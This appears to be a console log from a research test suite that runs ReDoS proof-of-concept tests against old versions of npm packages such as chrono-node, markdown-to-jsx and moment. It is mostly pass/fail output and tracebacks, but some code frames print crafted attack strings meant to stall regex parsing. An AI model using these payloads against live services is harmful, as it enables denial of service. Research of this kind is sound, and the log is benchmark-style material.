Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/redos/test_modules_in_serial.py", line 31, in <module>
    ping = subprocess.run(['jest', '--forceExit', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['jest', '--forceExit', 'redos/natural_5.1.0/natural.test.js']' returned non-zero exit status 1.
redos/prompts_2.4.0/prompts.test.js
FAIL prompts_2.4.0/prompts.test.js
  ✕ ReDos in prompts (1189 ms)

  ● ReDos in prompts

    TypeError: /Users/masudulhasanmasudbhuiyan/Music/vulns4js/redos/node_modules/prompts/lib/prompts.js: Cannot read properties of undefined (reading 'unshift')

      71 |           if (path.node.id) name = path.node.id.name;
      72 |           // console.log(path.node.body);
    > 73 |           path.node.body.body.unshift(
         |                               ^
      74 |             t.callExpression(t.identifier("pushFct"), [
      75 |               t.stringLiteral(name + ":" + path.node.loc.start.line),
      76 |             ])

      at PluginPass.enter (../prototype-pollution/babel-instrumentor.js:73:31)
      at newFn (../node_modules/@babel/traverse/lib/visitors.js:177:21)
      at NodePath._call (../node_modules/@babel/traverse/lib/path/context.js:53:20)
      at NodePath.call (../node_modules/@babel/traverse/lib/path/context.js:40:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:100:31)
      at TraversalContext.visitQueue (../node_modules/@babel/traverse/lib/context.js:103:16)
      at TraversalContext.visitSingle (../node_modules/@babel/traverse/lib/context.js:77:19)
      at TraversalContext.visit (../node_modules/@babel/traverse/lib/context.js:131:19)
      at traverseNode (../node_modules/@babel/traverse/lib/traverse-node.js:24:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:107:52)

  ● ReDos in prompts

    TypeError: Cannot read properties of undefined (reading 'size')

      46 |    console.log(global.accessedProperties);   
      47 |    let maxChain = getMaxLength(global.fctsLog) - 1;
    > 48 |    let percUsed = Math.floor(global.accessedProperties.size /global.declaredProperties.length * 10);
         |                                                        ^
      49 |    if (global.accessedProperties.size === 0) percUsed = -1;
      50 |    if (maxChain >= 10) maxChain = 9;
      51 |    if (percUsed === 10) percUsed = 9;

      at Object.<anonymous> (require-interception.js:48:56)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        2.076 s
Ran all test suites matching /redos\/prompts_2.4.0\/prompts.test.js/i.
Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/redos/test_modules_in_serial.py", line 31, in <module>
    ping = subprocess.run(['jest', '--forceExit', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['jest', '--forceExit', 'redos/prompts_2.4.0/prompts.test.js']' returned non-zero exit status 1.
redos/prototype_0.0.5/prototype.test.js
FAIL prototype_0.0.5/prototype.test.js
  ✕ ReDos in prototype (2031 ms)

  ● ReDos in prototype

    ReferenceError: Class is not defined

      26 |         if (fs.existsSync(prefixed))
      27 |             currMod = prefixed;
    > 28 |         let result = jest.requireActual(currMod);
         |                           ^
      29 |         global.accessedProperties = new Set();
      30 |         global.declaredProperties = Object.keys(result);    
      31 |         

      at Object.<anonymous> (node_modules/prototype/lib/Class.js:3:23)
      at Object.<anonymous> (node_modules/prototype/lib/index.js:4:23)
      at Object.<anonymous> (require-interception.js:28:27)

  ● ReDos in prototype

    TypeError: Cannot read properties of undefined (reading 'size')

      46 |    console.log(global.accessedProperties);   
      47 |    let maxChain = getMaxLength(global.fctsLog) - 1;
    > 48 |    let percUsed = Math.floor(global.accessedProperties.size /global.declaredProperties.length * 10);
         |                                                        ^
      49 |    if (global.accessedProperties.size === 0) percUsed = -1;
      50 |    if (maxChain >= 10) maxChain = 9;
      51 |    if (percUsed === 10) percUsed = 9;

      at Object.<anonymous> (require-interception.js:48:56)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        2.931 s
Ran all test suites matching /redos\/prototype_0.0.5\/prototype.test.js/i.
Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/redos/test_modules_in_serial.py", line 31, in <module>
    ping = subprocess.run(['jest', '--forceExit', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['jest', '--forceExit', 'redos/prototype_0.0.5/prototype.test.js']' returned non-zero exit status 1.
redos/ismobilejs_0.4.1/ismobilejs.test.js
FAIL ismobilejs_0.4.1/ismobilejs.test.js
  ✕ ReDos in ismobilejs (73 ms)

  ● ReDos in ismobilejs

    TypeError: Cannot set properties of undefined (setting 'apple')

      3 |   let ismobilejs = require("ismobilejs").Class;
      4 |   let t = measureTime(function () {
    > 5 |     ismobilejs("X".repeat(10000));
        |     ^
      6 |   });
      7 |   let time = t[0] + t[1] / 1000000000;
      8 |   expect(time).toBeGreaterThan(1);

      at ismobilejs (node_modules/ismobilejs/isMobile.js:75:9)
      at f (ismobilejs_0.4.1/ismobilejs.test.js:5:5)
      at measureTime (utils.js:35:3)
      at Object.<anonymous> (ismobilejs_0.4.1/ismobilejs.test.js:4:11)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        0.969 s
Ran all test suites matching /redos\/ismobilejs_0.4.1\/ismobilejs.test.js/i.
Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/redos/test_modules_in_serial.py", line 31, in <module>
    ping = subprocess.run(['jest', '--forceExit', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['jest', '--forceExit', 'redos/ismobilejs_0.4.1/ismobilejs.test.js']' returned non-zero exit status 1.
redos/vant_2.12.11/vant.test.js
FAIL vant_2.12.11/vant.test.js (11.139 s)
  ✕ ReDos in vant (10605 ms)

  ● ReDos in vant

    TypeError: /Users/masudulhasanmasudbhuiyan/Music/vulns4js/redos/node_modules/vue/dist/vue.cjs.js: Cannot read properties of undefined (reading 'unshift')

      71 |           if (path.node.id) name = path.node.id.name;
      72 |           // console.log(path.node.body);
    > 73 |           path.node.body.body.unshift(
         |                               ^
      74 |             t.callExpression(t.identifier("pushFct"), [
      75 |               t.stringLiteral(name + ":" + path.node.loc.start.line),
      76 |             ])

      at PluginPass.enter (../prototype-pollution/babel-instrumentor.js:73:31)
      at newFn (../node_modules/@babel/traverse/lib/visitors.js:177:21)
      at NodePath._call (../node_modules/@babel/traverse/lib/path/context.js:53:20)
      at NodePath.call (../node_modules/@babel/traverse/lib/path/context.js:40:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:100:31)
      at TraversalContext.visitQueue (../node_modules/@babel/traverse/lib/context.js:103:16)
      at TraversalContext.visitSingle (../node_modules/@babel/traverse/lib/context.js:77:19)
      at TraversalContext.visit (../node_modules/@babel/traverse/lib/context.js:131:19)
      at traverseNode (../node_modules/@babel/traverse/lib/traverse-node.js:24:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:107:52)

  ● ReDos in vant

    TypeError: Cannot read properties of undefined (reading 'size')

      46 |    console.log(global.accessedProperties);   
      47 |    let maxChain = getMaxLength(global.fctsLog) - 1;
    > 48 |    let percUsed = Math.floor(global.accessedProperties.size /global.declaredProperties.length * 10);
         |                                                        ^
      49 |    if (global.accessedProperties.size === 0) percUsed = -1;
      50 |    if (maxChain >= 10) maxChain = 9;
      51 |    if (percUsed === 10) percUsed = 9;

      at Object.<anonymous> (require-interception.js:48:56)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        11.505 s, estimated 12 s
Ran all test suites matching /redos\/vant_2.12.11\/vant.test.js/i.
Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/redos/test_modules_in_serial.py", line 31, in <module>
    ping = subprocess.run(['jest', '--forceExit', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['jest', '--forceExit', 'redos/vant_2.12.11/vant.test.js']' returned non-zero exit status 1.
redos/html-dom-parser_0.1.2/html-dom-parser.test.js
PASS html-dom-parser_0.1.2/html-dom-parser.test.js (15.866 s)
  ✓ ReDos in html-dom-parser (15444 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        16.25 s, estimated 17 s
Ran all test suites matching /redos\/html-dom-parser_0.1.2\/html-dom-parser.test.js/i.
Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
b"Loaded babel plugin\n  console.log\n    [ 'main' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'main' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 9, 8\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
redos/tough-cookie_2.3.2/tough-cookie.test.js
PASS tough-cookie_2.3.2/tough-cookie.test.js
  ✓ ReDos in tough-cookie (2402 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        4.096 s
Ran all test suites matching /redos\/tough-cookie_2.3.2\/tough-cookie.test.js/i.
Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
b"Loaded babel plugin\n  console.log\n    [\n      'CookieJar',     'Cookie',\n      'Store',         'MemoryCookieStore',\n      'parseDate',     'formatDate',\n      'parse',         'fromJSON',\n      'domainMatch',   'defaultPath',\n      'pathMatch',     'getPublicSuffix',\n      'cookieCompare', 'permuteDomain',\n      'permutePath',   'canonicalDomain'\n    ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'Cookie' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 0, 1\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
redos/markdown-it_9.1.0/markdown-it.test.js
PASS markdown-it_9.1.0/markdown-it.test.js (15.722 s)
  ✓ ReDos in markdown-it (15329 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        16.08 s
Ran all test suites matching /redos\/markdown-it_9.1.0\/markdown-it.test.js/i.
Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
b"Loaded babel plugin\n  console.log\n    [ 'main' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'main' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 9, 9\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
redos/chrono-node_2.2.3/chrono-node.test.js
FAIL chrono-node_2.2.3/chrono-node.test.js
  ✕ ReDoS in chrono-node (144 ms)

  ● ReDoS in chrono-node

    TypeError: /Users/masudulhasanmasudbhuiyan/Music/vulns4js/redos/node_modules/chrono-node/dist/utils/pattern.js: Cannot read properties of undefined (reading 'unshift')

      71 |           if (path.node.id) name = path.node.id.name;
      72 |           // console.log(path.node.body);
    > 73 |           path.node.body.body.unshift(
         |                               ^
      74 |             t.callExpression(t.identifier("pushFct"), [
      75 |               t.stringLiteral(name + ":" + path.node.loc.start.line),
      76 |             ])

      at PluginPass.enter (../prototype-pollution/babel-instrumentor.js:73:31)
      at newFn (../node_modules/@babel/traverse/lib/visitors.js:177:21)
      at NodePath._call (../node_modules/@babel/traverse/lib/path/context.js:53:20)
      at NodePath.call (../node_modules/@babel/traverse/lib/path/context.js:40:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:100:31)
      at TraversalContext.visitQueue (../node_modules/@babel/traverse/lib/context.js:103:16)
      at TraversalContext.visitMultiple (../node_modules/@babel/traverse/lib/context.js:72:17)
      at TraversalContext.visit (../node_modules/@babel/traverse/lib/context.js:129:19)
      at traverseNode (../node_modules/@babel/traverse/lib/traverse-node.js:24:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:107:52)

  ● ReDoS in chrono-node

    TypeError: chrono.parse is not a function

      4 |   let attack_str = "BGR3" + " ".repeat(40000) + "186'";
      5 |   let t = measureTime(function () {
    > 6 |     chrono.parse(attack_str);
        |            ^
      7 |   });
      8 |   let time = t[0] + t[1] / 1000000000;
      9 |   expect(time).toBeGreaterThan(1);

      at f (chrono-node_2.2.3/chrono-node.test.js:6:12)
      at measureTime (utils.js:35:3)
      at Object.<anonymous> (chrono-node_2.2.3/chrono-node.test.js:5:11)

  ● ReDoS in chrono-node

    TypeError: Cannot read properties of undefined (reading 'size')

      46 |    console.log(global.accessedProperties);   
      47 |    let maxChain = getMaxLength(global.fctsLog) - 1;
    > 48 |    let percUsed = Math.floor(global.accessedProperties.size /global.declaredProperties.length * 10);
         |                                                        ^
      49 |    if (global.accessedProperties.size === 0) percUsed = -1;
      50 |    if (maxChain >= 10) maxChain = 9;
      51 |    if (percUsed === 10) percUsed = 9;

      at Object.<anonymous> (require-interception.js:48:56)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        1.048 s
Ran all test suites matching /redos\/chrono-node_2.2.3\/chrono-node.test.js/i.
Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/redos/test_modules_in_serial.py", line 31, in <module>
    ping = subprocess.run(['jest', '--forceExit', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['jest', '--forceExit', 'redos/chrono-node_2.2.3/chrono-node.test.js']' returned non-zero exit status 1.
redos/marked_0.3.6/marked.test.js
PASS marked_0.3.6/marked.test.js
  ✓ ReDos in marked (3297 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        4.188 s
Ran all test suites matching /redos\/marked_0.3.6\/marked.test.js/i.
Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
b"Loaded babel plugin\n  console.log\n    [\n      'setOptions',  'options',\n      'defaults',    'Parser',\n      'parser',      'Renderer',\n      'Lexer',       'lexer',\n      'InlineLexer', 'inlineLexer',\n      'parse',       'main'\n    ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'main' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 0, 1\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
redos/locutus_2.0.10/locutus.test.js
PASS locutus_2.0.10/locutus.test.js (18.708 s)
  ✓ ReDos in locutus (18177 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        19.071 s
Ran all test suites matching /redos\/locutus_2.0.10\/locutus.test.js/i.
Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
b"Loaded babel plugin\n  console.log\n    [ 'c', 'golang', 'php', 'python', 'ruby' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(0) {}\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: -1, 2\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
redos/simple-markdown_0.7.2/simple-markdown.test.js
PASS simple-markdown_0.7.2/simple-markdown.test.js
  ✓ ReDos in simple-markdown (1508 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        2.403 s
Ran all test suites matching /redos\/simple-markdown_0.7.2\/simple-markdown.test.js/i.
Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
b"Loaded babel plugin\n  console.log\n    [\n      'defaultRules',       'parserFor',\n      'outputFor',          'inlineRegex',\n      'blockRegex',         'anyScopeRegex',\n      'parseInline',        'parseBlock',\n      'markdownToReact',    'markdownToHtml',\n      'ReactMarkdown',      'defaultBlockParse',\n      'defaultInlineParse', 'defaultImplicitParse',\n      'defaultReactOutput', 'defaultHtmlOutput',\n      'preprocess',         'sanitizeText',\n      'sanitizeUrl',        'unescapeUrl',\n      'htmlTag',            'reactElement',\n      'defaultRawParse',    'ruleOutput',\n      'reactFor',           'htmlFor',\n      'defaultParse',       'defaultOutput'\n    ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'defaultBlockParse' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 0, 5\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
redos/mime_1.4.0/mime.test.js
PASS mime_1.4.0/mime.test.js (7.99 s)
  ✓ ReDos in mime (7467 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        8.35 s
Ran all test suites matching /redos\/mime_1.4.0\/mime.test.js/i.
Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
b"Loaded babel plugin\n  console.log\n    [ 'types', 'extensions', 'default_type', 'Mime', 'charsets' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(3) { 'lookup', 'types', 'default_type' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 6, 1\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
redos/sanitize_2.0.0/sanitize.test.js
PASS sanitize_2.0.0/sanitize.test.js
  ✓ ReDos in sanitize (3498 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        4.425 s
Ran all test suites matching /redos\/sanitize_2.0.0\/sanitize.test.js/i.
Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
b"Loaded babel plugin\n  console.log\n    [ 'Sanitizer', 'middleware', 'main' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'main' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 3, 5\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
redos/brace-expansion_1.1.6/brace-expansion.test.js
PASS brace-expansion_1.1.6/brace-expansion.test.js
  ✓ ReDoS in brace-expansion (2148 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        3.047 s
Ran all test suites matching /redos\/brace-expansion_1.1.6\/brace-expansion.test.js/i.
Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
b"Loaded babel plugin\n  console.log\n    [ 'main' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'main' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 9, 4\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
redos/date-and-time_0.14.1/date-and-time.test.js
PASS date-and-time_0.14.1/date-and-time.test.js
  ✓ ReDoS in date-and-time (2690 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        3.584 s
Ran all test suites matching /redos\/date-and-time_0.14.1\/date-and-time.test.js/i.
Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
b"Loaded babel plugin\n  console.log\n    [\n      'compile',         'format',\n      'preparse',        'isValid',\n      'parse',           'transform',\n      'addYears',        'addMonths',\n      'addDays',         'addHours',\n      'addMinutes',      'addSeconds',\n      'addMilliseconds', 'subtract',\n      'isLeapYear',      'isSameDay',\n      'locale',          'extend',\n      'plugin'\n    ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'compile' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 0, 4\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
redos/moment_2.18.1/moment.test.js
PASS moment_2.18.1/moment.test.js
  ✓ ReDos in moment (3223 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        4.124 s
Ran all test suites matching /redos\/moment_2.18.1\/moment.test.js/i.
Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
b"Loaded babel plugin\n  console.log\n    [\n      'momentProperties',\n      'suppressDeprecationWarnings',\n      'deprecationHandler',\n      'parseTwoDigitYear',\n      'createFromInputFallback',\n      'ISO_8601',\n      'RFC_2822',\n      'updateOffset',\n      'defaultFormat',\n      'defaultFormatUtc',\n      'lang',\n      'langData',\n      'version',\n      'fn',\n      'min',\n      'max',\n      'now',\n      'utc',\n      'unix',\n      'months',\n      'isDate',\n      'locale',\n      'invalid',\n      'duration',\n      'isMoment',\n      'weekdays',\n      'parseZone',\n      'localeData',\n      'isDuration',\n      'monthsShort',\n      'weekdaysMin',\n      'defineLocale',\n      'updateLocale',\n      'locales',\n      'weekdaysShort',\n      'normalizeUnits',\n      'relativeTimeRounding',\n      'relativeTimeThreshold',\n      'calendarFormat',\n      'main'\n    ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'main' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 0, 6\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
redos/email-existence_0.1.5/email-existence.test.js
PASS email-existence_0.1.5/email-existence.test.js
  ✓ ReDos in email-existence (2386 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        3.268 s
Ran all test suites matching /redos\/email-existence_0.1.5\/email-existence.test.js/i.
Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
b"Loaded babel plugin\n  console.log\n    [ 'check', 'main' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(2) { 'main', 'check' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 9, 3\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
redos/markdown-to-jsx_5.4.2/markdown-to-jsx.test.js
FAIL markdown-to-jsx_5.4.2/markdown-to-jsx.test.js
  ✕ ReDos in markdown-to-jsx (380 ms)

  ● ReDos in markdown-to-jsx

    ReferenceError: attack_str is not defined

      3 |   const measureTime = require("../utils").measureTime;
      4 |   const { genstr } = require("../utils");
    > 5 |   attack_str = '<a foobar="foo' + genstr(90000, "\\!") + "/>";
        |             ^
      6 |   let t = measureTime(function () {
      7 |     compiler(attack_str, { disableParsingRawHTML: false });
      8 |   });

      at Object.<anonymous> (markdown-to-jsx_5.4.2/markdown-to-jsx.test.js:5:13)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        1.14 s, estimated 2 s
Ran all test suites matching /redos\/markdown-to-jsx_5.4.2\/markdown-to-jsx.test.js/i.
Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/redos/test_modules_in_serial.py", line 31, in <module>
    ping = subprocess.run(['jest', '--forceExit', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['jest', '--forceExit', 'redos/markdown-to-jsx_5.4.2/markdown-to-jsx.test.js']' returned non-zero exit status 1.
redos/d3-color_2.0.0/d3-color.test.js
PASS d3-color_2.0.0/d3-color.test.js (6.223 s)
  ✓ ReDoS in d3-color (5701 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        6.587 s
Ran all test suites matching /redos\/d3-color_2.0.0\/d3-color.test.js/i.
Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
b"Loaded babel plugin\n  console.log\n    [ 'color', 'cubehelix', 'gray', 'hcl', 'hsl', 'lab', 'lch', 'rgb' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'rgb' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 1, 3\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
redos/highlight.js_10.4.0/highlight.test.js
FAIL highlight.js_10.4.0/highlight.test.js
  ✕ ReDos in highlight.js (182 ms)

  ● ReDos in highlight.js

    TypeError: /Users/masudulhasanmasudbhuiyan/Music/vulns4js/redos/node_modules/highlight.js/lib/core.js: Cannot read properties of undefined (reading 'unshift')

      71 |           if (path.node.id) name = path.node.id.name;
      72 |           // console.log(path.node.body);
    > 73 |           path.node.body.body.unshift(
         |                               ^
      74 |             t.callExpression(t.identifier("pushFct"), [
      75 |               t.stringLiteral(name + ":" + path.node.loc.start.line),
      76 |             ])

      at PluginPass.enter (../prototype-pollution/babel-instrumentor.js:73:31)
      at newFn (../node_modules/@babel/traverse/lib/visitors.js:177:21)
      at NodePath._call (../node_modules/@babel/traverse/lib/path/context.js:53:20)
      at NodePath.call (../node_modules/@babel/traverse/lib/path/context.js:40:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:100:31)
      at TraversalContext.visitQueue (../node_modules/@babel/traverse/lib/context.js:103:16)
      at TraversalContext.visitMultiple (../node_modules/@babel/traverse/lib/context.js:72:17)
      at TraversalContext.visit (../node_modules/@babel/traverse/lib/context.js:129:19)
      at traverseNode (../node_modules/@babel/traverse/lib/traverse-node.js:24:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:107:52)

  ● ReDos in highlight.js

    TypeError: /Users/masudulhasanmasudbhuiyan/Music/vulns4js/redos/node_modules/highlight.js/lib/languages/r.js: Cannot read properties of undefined (reading 'unshift')

      71 |           if (path.node.id) name = path.node.id.name;
      72 |           // console.log(path.node.body);
    > 73 |           path.node.body.body.unshift(
         |                               ^
      74 |             t.callExpression(t.identifier("pushFct"), [
      75 |               t.stringLiteral(name + ":" + path.node.loc.start.line),
      76 |             ])

      at PluginPass.enter (../prototype-pollution/babel-instrumentor.js:73:31)
      at newFn (../node_modules/@babel/traverse/lib/visitors.js:177:21)
      at NodePath._call (../node_modules/@babel/traverse/lib/path/context.js:53:20)
      at NodePath.call (../node_modules/@babel/traverse/lib/path/context.js:40:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:100:31)
      at TraversalContext.visitQueue (../node_modules/@babel/traverse/lib/context.js:103:16)
      at TraversalContext.visitMultiple (../node_modules/@babel/traverse/lib/context.js:72:17)
      at TraversalContext.visit (../node_modules/@babel/traverse/lib/context.js:129:19)
      at traverseNode (../node_modules/@babel/traverse/lib/traverse-node.js:24:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:107:52)

  ● ReDos in highlight.js

    TypeError: Cannot read properties of undefined (reading 'size')

      46 |    console.log(global.accessedProperties);   
      47 |    let maxChain = getMaxLength(global.fctsLog) - 1;
    > 48 |    let percUsed = Math.floor(global.accessedProperties.size /global.declaredProperties.length * 10);
         |                                                        ^
      49 |    if (global.accessedProperties.size === 0) percUsed = -1;
      50 |    if (maxChain >= 10) maxChain = 9;
      51 |    if (percUsed === 10) percUsed = 9;

      at Object.<anonymous> (require-interception.js:48:56)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        1.082 s
Ran all test suites matching /redos\/highlight.js_10.4.0\/highlight.test.js/i.
Force exiting Jest: Have you considered using `--detectOpenHandles` to detect async operations that kept running after all tests finished?
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/redos/test_modules_in_serial.py", line 31, in <module>
    ping = subprocess.run(['jest', '--forceExit', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['jest', '--forceExit', 'redos/highlight.js_10.4.0/highlight.test.js']' returned non-zero exit status 1.
redos/is-my-json-valid_2.20.1/is-my-json-valid.test.js
PASS is-my-json-valid_2.20.1/is-my-json-valid.test.js (11.411 s)
  ✓ ReDos in is-my-json-valid (10890 ms)

